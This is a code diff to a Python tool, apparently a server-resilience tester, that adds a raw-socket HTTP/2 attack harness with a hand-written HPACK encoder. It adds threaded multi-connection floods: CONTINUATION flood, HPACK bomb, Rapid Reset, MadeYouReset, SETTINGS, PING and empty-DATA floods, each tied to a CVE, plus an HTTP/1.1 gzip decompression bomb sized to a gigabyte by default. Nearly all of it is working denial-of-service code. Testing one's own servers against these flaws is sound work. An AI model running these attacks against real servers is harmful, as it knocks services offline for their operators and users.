@@ -39,6 +39,7 @@ import ssl
 import sys
 import threading
 import time
+import zlib
 
 H2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
 
@@ -143,16 +144,38 @@ def huge_chunk(args):
     return _run_slow(args, opener, lambda i, d: b"A" * args.drip_bytes)
 
 
-# ── HTTP/2 CONTINUATION flood ────────────────────────────────────────────────
+# ── HTTP/2 attack toolkit ────────────────────────────────────────────────────
+#
+# One shared raw-socket harness backs every H2 attack: preface + empty SETTINGS,
+# a frame writer, a tiny HPACK encoder, and a threaded N-connection flood. No h2
+# library — the frames are built by hand so we can send exactly the malformed or
+# abusive sequence each attack needs.
 
 def _frame(ftype, flags, stream, payload):
     return (len(payload).to_bytes(3, "big") + bytes([ftype, flags])
             + (stream & 0x7FFFFFFF).to_bytes(4, "big") + payload)
 
 
+def _hpack_int(value, prefix_bits):
+    mask = (1 << prefix_bits) - 1
+    if value < mask:
+        return bytes([value])
+    out = bytearray([mask])
+    value -= mask
+    while value >= 128:
+        out.append((value & 0x7F) | 0x80)
+        value >>= 7
+    out.append(value)
+    return bytes(out)
+
+
+def _hpack_str(data):
+    return _hpack_int(len(data), 7) + data          # Huffman flag off
+
+
 def _hpack_filler(size):
-    """A header block of literal-without-indexing fields with new names (HPACK
-    0x00 prefix, Huffman off), each ~40 bytes, padded to `size`."""
+    """A header block of literal-without-indexing fields with new names, padded
+    to `size` — plain bulk, no decompression amplification (continuation-flood)."""
     out = bytearray()
     k = 0
     while len(out) < size:
@@ -163,44 +186,19 @@ def _hpack_filler(size):
     return bytes(out)
 
 
-def continuation_flood(args):
-    deadline = time.monotonic() + args.duration
-    lock = threading.Lock()
-    stats = dict(established=0, reaped=0, frames_sent=0, bytes_sent=0, connect_errors=0)
-    auth = args.host.encode()
-    # :method GET (0x82), :scheme http (0x86), :path / (0x84), then :authority
-    # as a literal with incremental indexing (name index 1).
-    initial_block = bytes([0x82, 0x86, 0x84, 0x41, len(auth)]) + auth
-    filler = _hpack_filler(16384)
+def _h2_get_block(authority):
+    """A GET / header block: :method/:scheme/:path indexed from the static table,
+    :authority literal WITHOUT indexing so the dynamic table stays empty."""
+    return bytes([0x82, 0x86, 0x84, 0x01]) + _hpack_str(authority.encode())
 
-    def worker():
-        local = dict(frames=0, nbytes=0)
-        try:
-            s = _open(args.host, args.port, args.tls, ["h2"] if args.tls else None)
-            s.sendall(H2_PREFACE)
-            s.sendall(_frame(0x4, 0, 0, b""))               # empty SETTINGS
-            # HEADERS: END_STREAM (0x1), but NOT END_HEADERS — the block is open.
-            s.sendall(_frame(0x1, 0x1, 1, initial_block))
-            with lock:
-                stats["established"] += 1
-            while time.monotonic() < deadline:
-                s.sendall(_frame(0x9, 0x0, 1, filler))      # CONTINUATION, no END_HEADERS
-                local["frames"] += 1
-                local["nbytes"] += len(filler) + 9
-        except OSError:
-            with lock:
-                stats["reaped"] += 1
-        finally:
-            with lock:
-                stats["frames_sent"] += local["frames"]
-                stats["bytes_sent"] += local["nbytes"]
-            try:
-                s.close()
-            except (OSError, UnboundLocalError, NameError):
-                pass
 
+def _new_stats():
+    return dict(established=0, reaped=0, frames_sent=0, bytes_sent=0, connect_errors=0)
+
+
+def _run_workers(n, deadline, worker):
     threads = []
-    for _ in range(args.conns):
+    for _ in range(n):
         if time.monotonic() > deadline:
             break
         t = threading.Thread(target=worker, daemon=True)
@@ -208,6 +206,216 @@ def continuation_flood(args):
         threads.append(t)
     for t in threads:
         t.join(timeout=max(0.0, deadline - time.monotonic()) + 5)
+
+
+def _h2_session(args, stats, lock, body, deadline):
+    """Open one H2(c) connection, send the preface + an empty SETTINGS, then run
+    body(s, deadline) -> (frames, nbytes) until it returns or the peer drops us."""
+    s = None
+    try:
+        s = _open(args.host, args.port, args.tls, ["h2"] if args.tls else None)
+        s.sendall(H2_PREFACE)
+        s.sendall(_frame(0x4, 0, 0, b""))               # empty SETTINGS
+        with lock:
+            stats["established"] += 1
+        frames, nbytes = body(s, deadline)
+        with lock:
+            stats["frames_sent"] += frames
+            stats["bytes_sent"] += nbytes
+    except OSError:
+        with lock:
+            stats["reaped"] += 1
+    finally:
+        if s is not None:
+            try:
+                s.close()
+            except OSError:
+                pass
+
+
+def _h2_flood(args, body):
+    """N connections, each running body(s, deadline). Shared, locked stats."""
+    deadline = time.monotonic() + args.duration
+    stats = _new_stats()
+    lock = threading.Lock()
+    _run_workers(args.conns, deadline,
+                 lambda: _h2_session(args, stats, lock, body, deadline))
+    return stats
+
+
+def continuation_flood(args):
+    # HEADERS (END_STREAM, no END_HEADERS) then an endless stream of CONTINUATION
+    # frames that never set END_HEADERS: the server buffers an unbounded header
+    # block (CVE-2024-27316).
+    initial = _h2_get_block(args.host)
+    filler = _hpack_filler(16384)
+
+    def body(s, deadline):
+        f = nb = 0
+        s.sendall(_frame(0x1, 0x1, 1, initial)); f += 1; nb += len(initial) + 9
+        while time.monotonic() < deadline:
+            s.sendall(_frame(0x9, 0x0, 1, filler)); f += 1; nb += len(filler) + 9
+        return f, nb
+
+    return _h2_flood(args, body)
+
+
+def hpack_bomb(args):
+    # Insert one ~3.9 KB header into the HPACK dynamic table (literal + incremental
+    # indexing -> index 62), then flood CONTINUATION frames of 1-byte indexed
+    # references (0xBE) to it. Each byte re-materializes the whole header, so a few
+    # KB on the wire decode to hundreds of MB-GB of live header structures.
+    big = b"\x40" + _hpack_str(b"x-b") + _hpack_str(b"a" * 3900)
+    initial = bytes([0x82, 0x86, 0x84, 0x01]) + _hpack_str(args.host.encode()) + big
+    refs = b"\xBE" * 16384                          # 0x80|62: indexed field, dyn index 62
+
+    def body(s, deadline):
+        f = nb = 0
+        s.sendall(_frame(0x1, 0x1, 1, initial)); f += 1; nb += len(initial) + 9
+        while time.monotonic() < deadline:
+            s.sendall(_frame(0x9, 0x0, 1, refs)); f += 1; nb += len(refs) + 9
+        return f, nb
+
+    return _h2_flood(args, body)
+
+
+def rapid_reset(args):
+    # Open a stream (HEADERS, END_STREAM+END_HEADERS) then immediately RST_STREAM
+    # (CANCEL) before reading the response, in a tight loop. The slot frees at
+    # once so streams are unbounded, while request work keeps piling up
+    # (CVE-2023-44487).
+    hdr = _h2_get_block(args.host)
+
+    def body(s, deadline):
+        f = nb = 0
+        sid = 1
+        while time.monotonic() < deadline and sid < 0x7FFFFFFF:
+            buf = _frame(0x1, 0x5, sid, hdr) + _frame(0x3, 0x0, sid, b"\x00\x00\x00\x08")
+            s.sendall(buf); f += 1; nb += len(buf); sid += 2
+        return f, nb
+
+    return _h2_flood(args, body)
+
+
+def madeyoureset(args):
+    # Like rapid-reset, but the attacker never sends RST: a WINDOW_UPDATE of 0 on
+    # the just-opened stream is a protocol error, so the SERVER resets it. Defeats
+    # client-RST rate limits (CVE-2025-8671).
+    hdr = _h2_get_block(args.host)
+
+    def body(s, deadline):
+        f = nb = 0
+        sid = 1
+        while time.monotonic() < deadline and sid < 0x7FFFFFFF:
+            buf = _frame(0x1, 0x5, sid, hdr) + _frame(0x8, 0x0, sid, b"\x00\x00\x00\x00")
+            s.sendall(buf); f += 1; nb += len(buf); sid += 2
+        return f, nb
+
+    return _h2_flood(args, body)
+
+
+def settings_flood(args):
+    # Stream empty SETTINGS frames; the peer must ACK every one (CVE-2019-9515).
+    frame = _frame(0x4, 0x0, 0, b"")
+
+    def body(s, deadline):
+        f = nb = 0
+        while time.monotonic() < deadline:
+            s.sendall(frame); f += 1; nb += len(frame)
+        return f, nb
+
+    return _h2_flood(args, body)
+
+
+def ping_flood(args):
+    # Stream non-ACK PING frames; the peer must PING-ACK every one (CVE-2019-9512).
+    frame = _frame(0x6, 0x0, 0, b"\x00" * 8)
+
+    def body(s, deadline):
+        f = nb = 0
+        while time.monotonic() < deadline:
+            s.sendall(frame); f += 1; nb += len(frame)
+        return f, nb
+
+    return _h2_flood(args, body)
+
+
+def empty_frame_flood(args):
+    # Open a stream, then flood zero-length DATA frames with no END_STREAM: each
+    # costs parse + state-machine work but makes no progress (CVE-2019-9518).
+    hdr = _h2_get_block(args.host)
+    empty = _frame(0x0, 0x0, 1, b"")
+
+    def body(s, deadline):
+        f = nb = 0
+        s.sendall(_frame(0x1, 0x4, 1, hdr)); f += 1; nb += len(hdr) + 9   # END_HEADERS, stream open
+        while time.monotonic() < deadline:
+            s.sendall(empty); f += 1; nb += len(empty)
+        return f, nb
+
+    return _h2_flood(args, body)
+
+
+# ── Decompression bomb (HTTP/1.1) ────────────────────────────────────────────
+
+def _gzip_bomb(size):
+    """A gzip stream that inflates to `size` zero bytes (built streaming, so the
+    client never holds the decompressed form — the output is a few KB-MB)."""
+    co = zlib.compressobj(6, zlib.DEFLATED, 16 + 15)    # 16+15 = gzip wrapper
+    out = bytearray()
+    chunk = b"\x00" * (1 << 20)
+    remaining = size
+    while remaining > 0:
+        n = min(len(chunk), remaining)
+        out += co.compress(chunk if n == len(chunk) else chunk[:n])
+        remaining -= n
+    out += co.flush()
+    return bytes(out)
+
+
+def decompression_bomb(args):
+    # POST a small gzip body that inflates to gigabytes. A server that decodes
+    # request Content-Encoding before any size check inflates into memory and
+    # OOMs; one that does not is a clean "survived".
+    bomb = _gzip_bomb(args.bomb_size)
+    req = ((f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
+            f"Content-Encoding: gzip\r\nContent-Type: application/octet-stream\r\n"
+            f"Content-Length: {len(bomb)}\r\n\r\n").encode() + bomb)
+    deadline = time.monotonic() + args.duration
+    stats = _new_stats()
+    lock = threading.Lock()
+
+    def worker():
+        sent = nb = 0
+        s = None
+        established = reaped = False
+        try:
+            s = _open(args.host, args.port, args.tls, ["http/1.1"] if args.tls else None)
+            s.settimeout(5)
+            established = True
+            while time.monotonic() < deadline:
+                try:
+                    s.sendall(req); sent += 1; nb += len(req)
+                    s.recv(65536)
+                except socket.timeout:
+                    continue
+        except OSError:
+            reaped = True
+        finally:
+            with lock:
+                if established:
+                    stats["established"] += 1
+                if reaped:
+                    stats["reaped"] += 1
+                stats["frames_sent"] += sent
+                stats["bytes_sent"] += nb
+            if s is not None:
+                try:
+                    s.close()
+                except OSError:
+                    pass
+
+    _run_workers(args.conns, deadline, worker)
     return stats
 
 
@@ -215,7 +423,14 @@ ATTACKS = {
     "slow-body": slow_body,
     "slow-headers": slow_headers,
     "huge-chunk": huge_chunk,
+    "decompression-bomb": decompression_bomb,
     "continuation-flood": continuation_flood,
+    "hpack-bomb": hpack_bomb,
+    "rapid-reset": rapid_reset,
+    "madeyoureset": madeyoureset,
+    "settings-flood": settings_flood,
+    "ping-flood": ping_flood,
+    "empty-frame-flood": empty_frame_flood,
 }
 
 
@@ -230,6 +445,7 @@ def main():
     p.add_argument("--drip-interval", type=float, default=1.0, dest="drip_interval")
     p.add_argument("--body-size", type=int, default=10 * 1024 * 1024, dest="body_size")
     p.add_argument("--drip-bytes", type=int, default=1, dest="drip_bytes")
+    p.add_argument("--bomb-size", type=int, default=1024 * 1024 * 1024, dest="bomb_size")
     p.add_argument("--tls", action="store_true")
     args = p.parse_args()
 
